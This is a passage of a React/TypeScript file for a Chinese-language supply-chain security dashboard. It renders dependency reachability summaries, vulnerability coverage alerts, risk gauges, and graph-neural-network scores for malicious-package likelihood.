              {scanning ? <Loader2 className='size-4 animate-spin' /> : <RefreshCw className='size-4' />}
              {dependencyAuditCompleted ? '重新研判' : '开始研判'}
            </Button>
            <input ref={supplementInputRef} type='file' accept={SUPPLEMENT_PROJECT_ARCHIVE_ACCEPT} className='hidden' onChange={(event) => void handleSupplementFileChange(event)} />
            {hasDependencies ? (
              <Button size='sm' variant='outline' onClick={() => supplementInputRef.current?.click()} disabled={supplementing}>
                {supplementing ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
                {SUPPLEMENT_FILE_LABEL}
              </Button>
            ) : null}
            {dependencyAuditCompleted ? (
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button size='icon' variant='outline' className='size-8' aria-label='更多研判操作' title='更多研判操作'>
                    <MoreHorizontal className='size-4' />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align='end' className='w-40'>
                  <DropdownMenuItem onSelect={() => downloadReport(normalizeReportForDisplay(getWorkspaceReport(workspace), workspace))}>
                    <Download className='size-4' />
                    导出报告
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            ) : null}
          </div>
        </div>
      </section>

      {hasDependencies && vulnerabilityCoverage && !vulnerabilityCoverage.complete ? (
        <Alert className='rounded-md border-amber-500/40 bg-amber-500/5'>
          <AlertTriangle className='size-4 text-amber-500' />
          <AlertTitle>漏洞查询覆盖不完整</AlertTitle>
          <AlertDescription>
            {vulnerabilityCoverage.message} 当前“OSV 命中 {workspace.dependency_audit?.summary.osv_matches ?? 0}”不代表项目没有已知漏洞。
          </AlertDescription>
        </Alert>
      ) : null}

      {!hasDependencies ? (
        <SupplyReachabilityEmptyState
          workspace={workspace}
          completed={dependencyAuditCompleted}
          scanning={scanning}
          supplementing={supplementing}
          onScan={() => void rerunReachability()}
          onSupplement={() => supplementInputRef.current?.click()}
        />
      ) : (
        <>
          <SupplyReachabilitySummary
            total={reachabilityItems.length}
            direct={directDependencies}
            vulnerable={vulnerableDependencies}
            reachable={reachableDependencies}
            pending={pendingDependencies}
            gaps={evidenceGapCount}
            ecosystems={ecosystems}
          />
          <div className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_400px]'>
            <ReachabilityDependencyWorkbench
              items={filteredRows}
              totalCount={reachabilityItems.length}
              selectedId={selectedItem?.id ?? ''}
              onSelectDependency={setSelectedDependencyId}
              reachabilityFilter={reachabilityFilter}
              onReachabilityFilter={setReachabilityFilter}
              severityFilter={severityFilter}
              onSeverityFilter={setSeverityFilter}
              reachabilityOptions={reachabilityOptions}
              severityOptions={severityOptions}
            />
            <DependencyDetailWorkbench
              workspace={workspace}
              item={selectedItem}
              onActiveEvidence={setActiveEvidence}
            />
          </div>
        </>
      )}
    </div>
  )
}

function SupplyReachabilityEmptyState({
  workspace,
  completed,
  scanning,
  supplementing,
  onScan,
  onSupplement,
}: {
  workspace: SecurityWorkspace
  completed: boolean
  scanning: boolean
  supplementing: boolean
  onScan: () => void
  onSupplement: () => void
}) {
  const dependencyFiles = workspace.import?.summary?.dependencyFiles ?? []
  const targetLabel = workspace.import?.sourcePath || workspace.workspace.repository || '当前导入项目'
  const fileStats = workspace.import?.summary?.fileStats

  return (
    <section className='overflow-hidden rounded-md border border-border bg-[color:var(--surface-card)]'>
      <div className='grid xl:grid-cols-[minmax(0,1fr)_360px]'>
        <div className='flex min-h-[430px] items-center px-6 py-10 sm:px-10 xl:px-14'>
          <div className='max-w-2xl'>
            <span className='grid size-12 place-items-center rounded-md border border-amber-300/35 bg-amber-500/10 text-amber-700 dark:text-amber-200'>
              <Boxes className='size-6' />
            </span>
            <p className='mt-6 text-xs font-semibold tracking-[0.08em] text-amber-700 uppercase dark:text-amber-300'>证据不足</p>
            <h3 className='mt-2 text-2xl font-semibold tracking-[0] text-foreground'>
              {completed ? '本次研判未识别到依赖' : '尚未执行供应链可达性研判'}
            </h3>
            <p className='mt-3 max-w-xl text-sm leading-6 text-muted-foreground'>
              {completed
                ? '当前项目没有可用于构建依赖图的清单或锁定文件，因此无法判断漏洞、引入路径和代码可达性。这不是“低风险”或“零风险”。'
                : '系统需要先读取依赖清单或锁定文件，建立直接与传递依赖关系，才能继续匹配漏洞、代码引用、入口和运行证据。'}
            </p>

            <dl className='mt-7 grid gap-x-8 gap-y-4 border-y border-border py-5 text-sm sm:grid-cols-2'>
              <div className='min-w-0'>
                <dt className='text-xs text-muted-foreground'>项目位置</dt>
                <dd className='mt-1 truncate font-medium text-foreground' title={targetLabel}>{targetLabel}</dd>
              </div>
              <div>
                <dt className='text-xs text-muted-foreground'>已识别依赖文件</dt>
                <dd className='mt-1 font-medium tabular-nums text-foreground'>{dependencyFiles.length}</dd>
              </div>
              <div>
                <dt className='text-xs text-muted-foreground'>项目文件</dt>
                <dd className='mt-1 font-medium tabular-nums text-foreground'>{fileStats?.total ?? '待统计'}</dd>
              </div>
              <div>
                <dt className='text-xs text-muted-foreground'>当前结论</dt>
                <dd className='mt-1 font-medium text-amber-700 dark:text-amber-200'>无法评估依赖风险</dd>
              </div>
            </dl>

            <div className='mt-7 flex flex-wrap items-center gap-3'>
              <Button className={actionButtonClass} onClick={onSupplement} disabled={supplementing}>
                {supplementing ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
                补充依赖文件
              </Button>
              <Button variant='outline' onClick={onScan} disabled={scanning}>
                {scanning ? <Loader2 className='size-4 animate-spin' /> : <RefreshCw className='size-4' />}
                {scanning ? '正在研判' : completed ? '重新研判' : '开始研判'}
              </Button>
            </div>
          </div>
        </div>

        <aside className='border-t border-border bg-[color:var(--surface-inset)] px-6 py-8 xl:border-t-0 xl:border-l'>
          <div className='flex items-center gap-2'>
            <FileSearch className='size-4 text-cyan-600 dark:text-cyan-300' />
            <h4 className='text-sm font-semibold'>可补充的依赖材料</h4>
          </div>
          <div className='mt-5 space-y-5'>
            {[
              ['Node.js', 'package-lock.json、package.json、yarn.lock、pnpm-lock.yaml'],
              ['Python', 'requirements.txt、Pipfile.lock、poetry.lock'],
              ['Java', 'pom.xml、build.gradle、gradle.lockfile'],
              ['其他生态', 'go.mod、Cargo.lock、composer.lock 或 CycloneDX SBOM'],
            ].map(([title, description]) => (
              <div key={title} className='grid grid-cols-[20px_minmax(0,1fr)] gap-3'>
                <FileText className='mt-0.5 size-4 text-cyan-600 dark:text-cyan-300' />
                <div>
                  <div className='text-sm font-medium text-foreground'>{title}</div>
                  <p className='mt-1 text-xs leading-5 text-muted-foreground'>{description}</p>
                </div>
              </div>
            ))}
          </div>
          <p className='mt-7 border-t border-border pt-5 text-xs leading-5 text-muted-foreground'>
            建议优先上传锁定文件，它能提供确定版本和传递依赖关系，减少误报。
          </p>
        </aside>
      </div>
    </section>
  )
}

function SupplyReachabilitySummary({
  total,
  direct,
  vulnerable,
  reachable,
  pending,
  gaps,
  ecosystems,
}: {
  total: number
  direct: number
  vulnerable: number
  reachable: number
  pending: number
  gaps: number
  ecosystems: string[]
}) {
  const metrics = [
    { label: '依赖总数', value: total, tone: 'text-foreground' },
    { label: '直接依赖', value: direct, tone: 'text-cyan-700 dark:text-cyan-300' },
    { label: '漏洞依赖', value: vulnerable, tone: 'text-red-600 dark:text-red-300' },
    { label: '已可达', value: reachable, tone: 'text-orange-600 dark:text-orange-300' },
    { label: '待研判', value: pending, tone: 'text-amber-600 dark:text-amber-300' },
    { label: '证据缺口', value: gaps, tone: 'text-amber-600 dark:text-amber-300' },
  ]

  return (
    <section className='rounded-md border border-border bg-[color:var(--surface-card)]'>
      <div className='flex flex-wrap items-center justify-between gap-3 border-b border-border px-5 py-3'>
        <div>
          <h3 className='text-sm font-semibold text-foreground'>依赖研判概览</h3>
          <p className='mt-0.5 text-xs text-muted-foreground'>{ecosystems.length ? ecosystems.join(' / ') : '依赖生态待确认'}</p>
        </div>
        <span className='text-xs text-muted-foreground'>传递依赖 {Math.max(0, total - direct)}</span>
      </div>
      <div className='grid grid-cols-2 divide-x divide-y divide-border sm:grid-cols-3 xl:grid-cols-6 xl:divide-y-0'>
        {metrics.map((metric) => (
          <div key={metric.label} className='px-5 py-4'>
            <div className='text-xs text-muted-foreground'>{metric.label}</div>
            <div className={cn('mt-1 text-2xl font-semibold tabular-nums tracking-[0]', metric.tone)}>{metric.value}</div>
          </div>
        ))}
      </div>
    </section>
  )
}

function ReachabilityDependencyWorkbench({
  items,
  totalCount,
  selectedId,
  onSelectDependency,
  reachabilityFilter,
  onReachabilityFilter,
  severityFilter,
  onSeverityFilter,
  reachabilityOptions,
  severityOptions,
}: {
  items: ReachabilityAnalysisItem[]
  totalCount: number
  selectedId: string
  onSelectDependency: (id: string) => void
  reachabilityFilter: ReachabilityStatus | 'all'
  onReachabilityFilter: (value: ReachabilityStatus | 'all') => void
  severityFilter: SecuritySeverity | 'all'
  onSeverityFilter: (value: SecuritySeverity | 'all') => void
  reachabilityOptions: ReachabilityStatus[]
  severityOptions: SecuritySeverity[]
}) {
  const [query, setQuery] = useState('')
  const normalizedQuery = query.trim().toLowerCase()
  const visibleItems = normalizedQuery
    ? items.filter((item) => `${item.name} ${item.currentVersion} ${item.packageManager} ${item.sourceFiles.join(' ')}`.toLowerCase().includes(normalizedQuery))
    : items

  return (
    <Card className='flex h-[600px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)]'>
      <CardHeader className='border-b border-border pb-3'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div>
            <div className='flex items-center gap-2'>
              <CardTitle className='text-section-title'>依赖与可达性</CardTitle>
              <span className='meta-chip'>{visibleItems.length}/{totalCount}</span>
            </div>
            <p className='mt-1 text-xs text-muted-foreground'>按风险和证据确定修复优先级</p>
          </div>
          <div className='flex flex-wrap items-center gap-2'>
            <Select value={reachabilityFilter} onValueChange={(value) => onReachabilityFilter(value as ReachabilityStatus | 'all')}>
              <SelectTrigger size='sm' className='h-8 min-w-[104px] bg-[color:var(--surface-inset)]'>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部状态</SelectItem>
                {reachabilityOptions.map((status) => <SelectItem key={status} value={status}>{reachabilityStatusLabel(status)}</SelectItem>)}
              </SelectContent>
            </Select>
            <Select value={severityFilter} onValueChange={(value) => onSeverityFilter(value as SecuritySeverity | 'all')}>
              <SelectTrigger size='sm' className='h-8 min-w-[104px] bg-[color:var(--surface-inset)]'>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部等级</SelectItem>
                {severityOptions.map((severity) => <SelectItem key={severity} value={severity}>{severityLabel(severity)}</SelectItem>)}
              </SelectContent>
            </Select>
          </div>
        </div>
        <div className='relative mt-3'>
          <Search className='pointer-events-none absolute top-1/2 left-3 size-4 -translate-y-1/2 text-muted-foreground' />
          <Input value={query} onChange={(event) => setQuery(event.target.value)} placeholder='搜索包名、版本或来源文件' className='h-9 bg-[color:var(--surface-inset)] pr-9 pl-9' />
          {query ? (
            <button type='button' onClick={() => setQuery('')} className='absolute top-1/2 right-2 grid size-6 -translate-y-1/2 place-items-center rounded text-muted-foreground hover:bg-[color:var(--surface-hover)]' aria-label='清空依赖搜索'>
              <X className='size-3.5' />
            </button>
          ) : null}
        </div>
      </CardHeader>
      <CardContent className='min-h-0 flex-1 p-0'>
        {visibleItems.length ? (
          <div className='h-full overflow-y-auto [scrollbar-gutter:stable] [scrollbar-width:thin]'>
            <div className='divide-y divide-border'>
              {visibleItems.map((item) => {
                const evidenceCount = item.evidence.codeRefs + item.evidence.entryHits + item.evidence.runtimeEvidence + item.evidence.externalAlerts + item.evidence.attackChainLinks
                const selected = item.id === selectedId
                const safeVersion = dependencySafeVersion(item)
                return (
                  <button
                    key={item.id}
                    type='button'
                    onClick={() => onSelectDependency(item.id)}
                    className={cn(
                      'grid w-full gap-3 px-5 py-3 text-left transition-colors sm:grid-cols-[minmax(0,1fr)_auto] sm:items-center',
                      selected ? 'border-l-2 border-l-cyan-500 bg-cyan-500/[0.07] pl-[18px]' : 'border-l-2 border-l-transparent hover:bg-[color:var(--surface-hover)]'
                    )}
                  >
                    <span className='min-w-0'>
                      <span className='flex min-w-0 flex-wrap items-center gap-2'>
                        <span className='truncate text-sm font-semibold text-foreground'>{item.name}@{item.currentVersion || '-'}</span>
                        <ReachabilitySeverityBadge severity={item.severity} />
                        <ReachabilityStatePill state={item.status} />
                      </span>
                      <span className='mt-1.5 flex min-w-0 flex-wrap items-center gap-x-3 gap-y-1 text-xs text-muted-foreground'>
                        <span>{item.dependency.dependency_type === 'transitive' ? '传递依赖' : '直接依赖'}</span>
                        <span>{item.packageManager}</span>
                        <span>{item.advisories.length} 个漏洞</span>
                        <span>{evidenceCount} 条证据</span>
                        {safeVersion ? <span className='text-emerald-700 dark:text-emerald-300'>可升级 {safeVersion}</span> : null}
                      </span>
                      <span className='mt-1 block truncate font-mono text-[11px] text-muted-foreground' title={item.sourceFiles.join(' / ')}>
                        {item.sourceFiles.length ? item.sourceFiles.map(compactDependencySource).join(' · ') : '来源文件待确认'}
                      </span>
                    </span>
                    <span className='hidden items-center gap-4 text-xs tabular-nums text-muted-foreground sm:flex'>
                      <span>风险 <strong className='text-foreground'>{item.riskScore}</strong></span>
                      <ChevronRight className='size-4' />
                    </span>
                  </button>
                )
              })}
            </div>
          </div>
        ) : (
          <div className='grid h-full place-items-center px-6 text-center text-sm text-muted-foreground'>当前筛选条件下没有依赖。</div>
        )}
      </CardContent>
    </Card>
  )
}

function dependencySafeVersion(item: ReachabilityAnalysisItem) {
  return Array.from(new Set((item.dependency.vulnerabilities ?? []).flatMap((vulnerability) => vulnerability.fixed_versions ?? []))).filter(Boolean)[0] || ''
}

type ReachabilityWorkbenchStep = {
  id: string
  label: string
  value: string | number
  tone: 'hit' | 'risk' | 'gap'
}
type ReachabilityEvidenceKind = 'code' | 'entry' | 'execution' | 'external' | 'graph'

function ReachabilityGnnSummary({ items }: { items: ReachabilityAnalysisItem[] }) {
  const gnnItems = items.filter((item) => typeof item.dependency.gnn_score === 'number')
  if (!gnnItems.length) return null
  const judgedItems = gnnItems.filter((item) => isGnnJudged(item.dependency))

  const topItems = judgedItems
    .slice()
    .sort((left, right) => (right.dependency.gnn_score ?? 0) - (left.dependency.gnn_score ?? 0))
    .slice(0, 4)
  const highCount = judgedItems.filter((item) => item.dependency.gnn_label === 'high').length
  const elevatedCount = judgedItems.filter((item) => item.dependency.gnn_label === 'elevated').length
  const confidences = judgedItems
    .map((item) => item.dependency.gnn_confidence)
    .filter((value): value is number => typeof value === 'number')
  const avgConfidence = confidences.length
    ? confidences.reduce((sum, value) => sum + value, 0) / confidences.length
    : null
  const modelTypes = Array.from(new Set(gnnItems.map((item) => item.dependency.gnn_model_type).filter(Boolean)))

  return (
    <div className='mb-3 rounded-md border border-cyan-300/20 bg-cyan-400/10 p-3'>
      <div className='flex flex-wrap items-start justify-between gap-3'>
        <div>
          <div className='flex items-center gap-2 text-sm font-semibold text-cyan-100'>
            <BrainCircuit className='size-4' />
            GNN 恶意包判定证据
          </div>
          <div className='mt-1 text-xs text-muted-foreground'>
            图神经网络对当前高风险依赖重新打分，用于补充可达性、版本和相似恶意包证据。
          </div>
        </div>
        <div className='flex flex-wrap gap-1.5'>
          {modelTypes.slice(0, 2).map((model) => (
            <span key={model} className='rounded-full border border-cyan-300/25 bg-[color:var(--surface-inset)] px-2 py-0.5 text-[11px] text-cyan-100'>
              {model}
            </span>
          ))}
        </div>
      </div>

      <div className='mt-3 grid gap-2 text-xs sm:grid-cols-4'>
        <ReachabilityGnnMetric label='覆盖依赖' value={`${gnnItems.length}/${items.length}`} />
        <ReachabilityGnnMetric label='恶意倾向' value={String(highCount)} />
        <ReachabilityGnnMetric label='可疑倾向' value={String(elevatedCount)} />
        <ReachabilityGnnMetric label='平均判定确定度' value={avgConfidence === null ? '-' : formatPercent(avgConfidence)} />
      </div>

      <div className='mt-3 grid gap-2 lg:grid-cols-4'>
        {topItems.map((item) => (
          <button
            key={item.id}
            type='button'
            className='rounded-md border border-border bg-[color:var(--surface-inset)] p-2 text-left'
            title={item.dependency.gnn_explanations?.join('；') || item.dependency.gnn_reasons?.join('；') || item.name}
          >
            <div className='flex items-center justify-between gap-2'>
              <span className='min-w-0 truncate text-xs font-semibold text-foreground'>{item.name}</span>
              <ReachabilityGnnPill dependency={item.dependency} />
            </div>
            <div className='mt-1 truncate text-[11px] text-muted-foreground'>
              {item.dependency.gnn_explanations?.[0] || item.dependency.gnn_reasons?.[0] || item.dependency.gnn_model_type || 'malicious package similarity signal'}
            </div>
          </button>
        ))}
      </div>
    </div>
  )
}

function ReachabilityGnnMetric({ label, value }: { label: string; value: string }) {
  return (
    <div className='rounded-md border border-border bg-[color:var(--surface-inset)] px-2 py-2'>
      <div className='text-[11px] text-muted-foreground'>{label}</div>
      <div className='mt-1 text-sm font-semibold tabular-nums text-cyan-100'>{value}</div>
    </div>
  )
}

function ReachabilityGnnPill({ dependency }: { dependency: SecurityDependency }) {
  if (typeof dependency.gnn_score !== 'number') return null
  const decisionStatus = resolveGnnDecisionStatus(dependency)
  if (decisionStatus === 'abstain' || decisionStatus === 'unavailable') {
    return (
      <span
        className='rounded-full border border-amber-300/30 bg-amber-500/10 px-2 py-0.5 text-[11px] font-bold text-amber-200'
        title={decisionStatus === 'abstain' ? '输入超出训练分布，模型已拒绝给出确定结论' : '当前没有通过兼容性门禁的模型'}
      >
        {decisionStatus === 'abstain' ? 'GNN 暂不判定' : '模型不可用'}
      </span>
    )
  }
  const severity = dependencyGnnSeverity(dependency)
  const tone =
    severity === 'high'
      ? 'border-red-300/30 bg-red-500/10 text-red-200'
      : severity === 'medium'
        ? 'border-amber-300/30 bg-amber-500/10 text-amber-200'
        : 'border-emerald-300/30 bg-emerald-500/10 text-emerald-200'
  return (
    <span
      className={cn('rounded-full border px-2 py-0.5 text-[11px] font-bold tabular-nums', tone)}
      title={dependency.gnn_reasons?.join('；') || dependency.gnn_model_type || '模型分表示恶意包特征强度，不是总体风险评分'}
    >
      {gnnScoreLabel(dependency, formatPercent(dependency.gnn_score))}
    </span>
  )
}

function ReachabilityGnnEvidence({ dependency }: { dependency: SecurityDependency }) {
  const explanations = dependency.gnn_explanations?.length
    ? dependency.gnn_explanations
    : dependency.gnn_reasons ?? []
  const similarPackages = dependency.similar_malicious_packages ?? []
  const hasEvidence =
    typeof dependency.gnn_score === 'number'
    || typeof dependency.gnn_confidence === 'number'
    || explanations.length
    || similarPackages.length

  if (!hasEvidence) return null

  return (
    <div className='rounded-md border border-cyan-300/20 bg-cyan-400/10 p-3'>
      <div className='flex flex-wrap items-center gap-2'>
        <div className='text-xs font-semibold text-cyan-100'>GNN 模型证据</div>
        {dependency.gnn_model_type ? (
          <span className='rounded-full border border-cyan-300/25 bg-[color:var(--surface-inset)] px-2 py-0.5 text-[11px] text-cyan-100'>
            {dependency.gnn_model_type}
          </span>
        ) : null}
        {typeof dependency.gnn_confidence === 'number' ? (
          <span className='rounded-full border border-slate-400/15 bg-[color:var(--surface-inset)] px-2 py-0.5 text-[11px] text-[color:var(--type-body)]'>
            判定确定度 {formatPercent(dependency.gnn_confidence)}
          </span>
        ) : null}
        {resolveGnnDecisionStatus(dependency) === 'abstain' ? (
          <span className='rounded-full border border-amber-300/40 bg-amber-500/10 px-2 py-0.5 text-[11px] text-amber-200'>
            超出训练分布
          </span>
        ) : null}
      </div>

      <p className='mt-2 text-[11px] leading-5 text-muted-foreground'>
        恶意包概率或相似度只表示模型识别出的恶意行为特征；判定确定度不是准确率。总体风险还会综合漏洞、可达性和其他证据。
      </p>

      {resolveGnnDecisionStatus(dependency) === 'abstain' ? (
        <div className='mt-2 rounded-md border border-amber-300/50 bg-amber-50 px-2.5 py-2 text-[11px] leading-5 text-amber-800 dark:border-amber-900/60 dark:bg-amber-950/20 dark:text-amber-200'>
          当前依赖与训练数据差异较大，GNN 已拒绝给出确定结论，请以漏洞、调用与人工证据为准。
        </div>
      ) : null}

      {explanations.length ? (
        <ul className='mt-2 space-y-1 text-xs leading-5 text-muted-foreground'>
          {explanations.slice(0, 3).map((reason) => (
            <li key={reason} className='flex gap-2'>
              <span className='mt-2 size-1.5 shrink-0 rounded-full bg-cyan-300' />
              <span>{reason}</span>
            </li>
          ))}
        </ul>
      ) : null}

      {similarPackages.length ? (
        <div className='mt-2 flex flex-wrap gap-1.5'>
          {similarPackages.slice(0, 3).map((item) => (
            <span
              key={`${item.package}-${item.score}`}
              className='rounded-full border border-slate-400/15 bg-[color:var(--surface-inset)] px-2 py-0.5 text-[11px] text-muted-foreground'
            >
              {item.package || 'similar'} {typeof item.score === 'number' ? formatPercent(item.score) : ''}
            </span>
          ))}
        </div>
      ) : null}
    </div>
  )
}

function RiskScoreWorkbenchCard({
  score,
  severity,
  entryHits,
  codeHits,
  runtimeHits,
  graphHits,
  gapCount,
  selectedKey,
}: {
  score: number
  severity: SecuritySeverity
  entryHits: number
  codeHits: number
  runtimeHits: number
  graphHits: number
  gapCount: number
  selectedKey: string
}) {
  const reducedMotion = useReducedMotion()
  const normalized = Math.max(0, Math.min(100, Math.round(score || 0)))
  const radius = 44
  const circumference = 2 * Math.PI * radius
  const { value: displayScore, spring } = useAnimatedNumber(normalized, {
    stiffness: 40,
    damping: 15,
    delayMs: 120,
    durationMs: 1800,
    respectReducedMotion: false,
    resetKey: selectedKey,
  })
  const dashOffset = useTransform(spring, (latest) => circumference * (1 - Math.max(0, Math.min(100, latest)) / 100))
  const tone = riskGaugeTone(severity)
  const evidenceBar = [
    { label: '代码', value: codeHits },
    { label: '入口', value: entryHits },
    { label: '执行', value: runtimeHits },
    { label: '关联', value: graphHits },
  ]
  const evidenceTotal = Math.max(1, evidenceBar.reduce((sum, item) => sum + item.value, 0))

  return (
    <Card className='group h-[560px] overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-[0_14px_34px_rgba(2,6,23,0.24)] transition-[border-color,transform] duration-200 hover:-translate-y-0.5 hover:border-red-300/25 xl:h-[560px]'>
      <CardContent className='relative flex h-full flex-col p-4'>
        <div className={cn('absolute -right-10 -top-12 size-32 rounded-full blur-3xl', tone.glow)} />
        <div className='relative flex items-center justify-between gap-3'>
          <div className='text-label text-muted-foreground'>风险评分</div>
          <SeverityPill severity={severity} />
        </div>
        <div className='relative flex flex-1 items-center justify-center py-4'>
          <div className='relative size-44'>
            <motion.div
              className={cn('absolute inset-3 rounded-full blur-xl', tone.pulse)}
              animate={reducedMotion ? undefined : { opacity: [0.12, 0.25, 0.12], scale: [0.96, 1.04, 0.96] }}
              transition={{ duration: 2.8, repeat: Infinity, ease: 'easeInOut' }}
            />
            <svg viewBox='0 0 112 112' className='relative size-full -rotate-90'>
              <circle cx='56' cy='56' r={radius} className='fill-none stroke-[color:var(--muted)]' strokeWidth='8' />
              <motion.circle
                cx='56'
                cy='56'
                r={radius}
                className={cn('fill-none', tone.stroke)}
                strokeWidth='8'
                strokeLinecap='round'
                strokeDasharray={circumference}
                style={{ strokeDashoffset: dashOffset }}
              />
            </svg>
            <div className='absolute inset-0 grid place-items-center'>
              <div className='text-center'>
                <div className={cn('text-metric text-5xl', tone.text)}>{displayScore}</div>
                <div className='mt-1 text-label'>风险评分</div>
              </div>
            </div>
          </div>
        </div>
        <div className='grid grid-cols-3 gap-2'>
          {[
            ['命中入口', entryHits, 'text-cyan-200'],
            ['引用证据', codeHits, 'text-cyan-200'],
            ['证据缺口', gapCount, 'text-amber-200'],
          ].map(([label, value, color]) => (
            <div key={label} className='rounded-md border border-border bg-[color:var(--surface-inset)] px-2 py-2 text-center'>
              <div className='text-label'>{label}</div>
              <div className={cn('mt-1 text-xl font-bold tabular-nums', color)}>{value}</div>
            </div>
          ))}
        </div>
        <div className='mt-3 rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] p-2'>
          <div className='flex h-1.5 overflow-hidden rounded-full bg-slate-800'>
            {evidenceBar.map((item, index) => (
              <span
                key={item.label}
                className={cn(
                  'transition-all duration-300',
                  item.value > 0 ? (index === 2 ? 'bg-amber-300/70' : 'bg-cyan-300/70') : 'bg-slate-700/70'
                )}
                style={{ width: `${Math.max(item.value > 0 ? 10 : 6, (item.value / evidenceTotal) * 100)}%` }}
              />
            ))}
          </div>
          <div className='mt-2 flex flex-wrap items-center justify-between gap-2 text-label'>
            {evidenceBar.map((item) => (
              <span key={item.label} className='tabular-nums'>{item.label} {item.value}</span>
            ))}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function ReachabilityFlowWorkbench({
  steps,
  activeEvidence,
  onActiveEvidence,
  selectedItem,
  rows,
  selectedId,
  onSelectDependency,
  reachabilityFilter,
  onReachabilityFilter,
  severityFilter,
  onSeverityFilter,
  reachabilityOptions,
  severityOptions,
  filteredCount,
  totalCount,
}: {
  steps: ReachabilityWorkbenchStep[]
  activeEvidence: string
  onActiveEvidence: (id: string) => void
  selectedItem?: ReachabilityAnalysisItem
  rows: ReachabilityMatrixRow[]
  selectedId: string
  onSelectDependency: (id: string) => void
  reachabilityFilter: ReachabilityStatus | 'all'
  onReachabilityFilter: (value: ReachabilityStatus | 'all') => void
  severityFilter: SecuritySeverity | 'all'
  onSeverityFilter: (value: SecuritySeverity | 'all') => void
  reachabilityOptions: ReachabilityStatus[]
  severityOptions: SecuritySeverity[]
  filteredCount: number
  totalCount: number
}) {
  const activeStep = steps.find((step) => step.id === activeEvidence) ?? steps[0]

  return (
    <Card className='flex h-[560px] flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-[0_14px_34px_rgba(2,6,23,0.24)] xl:h-[560px]'>
      <CardHeader className='pb-3'>
        <div className='flex flex-wrap items-start justify-between gap-3'>
          <div className='min-w-0'>
            <div className='flex items-center gap-2'>
              <CardTitle className='text-section-title'>依赖证据</CardTitle>
              <span className='meta-chip'>{filteredCount}/{totalCount}</span>
            </div>
            <div className='mt-1 truncate text-xs text-muted-foreground'>
              {selectedItem?.name || '-'}
            </div>
          </div>
          <div className='flex flex-wrap items-center justify-end gap-2'>
            <div className='flex flex-wrap gap-1.5'>
              {(['all', ...reachabilityOptions] as const).map((value) => (
                <button
                  key={value}
                  type='button'
                  className={cn(
                    'inline-flex h-7 items-center whitespace-nowrap rounded-full border px-2.5 text-[12px] font-bold transition-colors',
                    reachabilityFilter === value
                      ? 'border-cyan-300/40 bg-cyan-400/10 text-cyan-100'
                      : 'border-border bg-[color:var(--surface-inset)] text-muted-foreground hover:border-slate-300/30 hover:text-foreground'
                  )}
                  onClick={() => onReachabilityFilter(value)}
                >
                  {value === 'all' ? '全部' : reachabilityStatusLabel(value)}
                </button>
              ))}
            </div>
            <Select value={severityFilter} onValueChange={(value) => onSeverityFilter(value as SecuritySeverity | 'all')}>
              <SelectTrigger size='sm' className='h-7 min-w-[104px] border-border bg-[color:var(--surface-inset)] text-foreground'>
                <SelectValue placeholder='全部等级' />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部等级</SelectItem>
                {severityOptions.map((severity) => <SelectItem key={severity} value={severity}>{severityLabel(severity)}</SelectItem>)}
              </SelectContent>
            </Select>
          </div>
        </div>
      </CardHeader>
      <CardContent className='min-h-0 flex-1'>
        <div className='h-full min-h-0 overflow-y-auto overscroll-contain pr-1 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
          <PathEvidenceCoverage
            rows={rows}
            activeEvidence={activeEvidence}
            selectedId={selectedId}
            onActiveEvidence={onActiveEvidence}
            onSelectDependency={onSelectDependency}
            activeLabel={activeStep?.label ?? '证据'}
          />
        </div>
      </CardContent>
    </Card>
  )
}

function DependencyDetailWorkbench({
  workspace,
  item,
  onActiveEvidence,
}: {
  workspace: SecurityWorkspace
  item?: ReachabilityAnalysisItem
  onActiveEvidence: (id: string) => void
}) {
  const [detailKind, setDetailKind] = useState<ReachabilityEvidenceKind | null>(null)
  const openEvidenceDetail = (kind: ReachabilityEvidenceKind) => {
    onActiveEvidence(kind)
    setDetailKind(kind)
  }

  return (
    <motion.div
      className='h-full min-w-0 xl:h-[600px]'
      key={item?.id ?? 'empty-detail'}
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.24 }}
    >
    <Card className='flex h-[600px] min-w-0 flex-col overflow-hidden rounded-md border-border bg-[color:var(--surface-card)]'>
      <CardHeader className='border-b border-border pb-3'>
        <CardTitle className='min-w-0 truncate text-base text-foreground'>
          {item ? `${item.name}@${item.currentVersion || '-'}` : '依赖详情'}
        </CardTitle>
        <div className='mt-2 flex flex-wrap gap-2'>
          <ReachabilityStatePill state={item?.status ?? 'pending'} />
          <span className='rounded-full border border-red-400/25 bg-red-500/10 px-2 py-0.5 text-xs font-medium text-red-700 dark:text-red-200'>
            风险 {item?.riskScore ?? 0}
          </span>
          {item ? <span className='rounded-full border border-border bg-[color:var(--surface-inset)] px-2 py-0.5 text-xs text-muted-foreground'>{item.dependency.dependency_type === 'transitive' ? '传递依赖' : '直接依赖'}</span> : null}
          {item ? <ReachabilityGnnPill dependency={item.dependency} /> : null}
        </div>
      </CardHeader>
      <CardContent className='min-h-0 min-w-0 flex-1 p-0'>
        <Tabs defaultValue='overview' className='flex h-full min-h-0 flex-col'>
          <TabsList className='mx-4 mt-3 grid h-9 grid-cols-4 rounded-md'>
            <TabsTrigger value='overview'>概览</TabsTrigger>
            <TabsTrigger value='vulnerabilities'>漏洞</TabsTrigger>
            <TabsTrigger value='evidence'>证据</TabsTrigger>
            <TabsTrigger value='remediation'>修复</TabsTrigger>
          </TabsList>

          <div className='min-h-0 flex-1 overflow-y-auto px-4 py-3 [scrollbar-gutter:stable] [scrollbar-width:thin]'>
            <TabsContent value='overview' className='mt-0 space-y-3'>
